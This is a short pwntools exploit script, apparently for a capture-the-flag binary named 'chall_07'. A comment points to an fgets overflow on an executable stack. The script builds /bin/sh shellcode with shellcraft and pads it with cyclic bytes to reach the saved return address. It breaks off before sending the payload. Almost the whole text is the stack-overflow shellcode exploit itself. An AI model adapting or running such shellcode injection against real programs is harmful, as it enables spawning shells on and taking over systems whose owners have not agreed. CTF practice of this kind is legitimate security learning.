from pwn import *
context.arch = "amd64"
p = process("./chall_07")

'''
Stack executable
PIE enabled.
'''
# fgets vulnerability, allocates 0x70 (112) total size but string can be up to 0x80 (128)
shellcode = asm(shellcraft.sh())
offset =  0x80
payload = shellcode + cyclic(offset + 0x8 - len(shellcode))
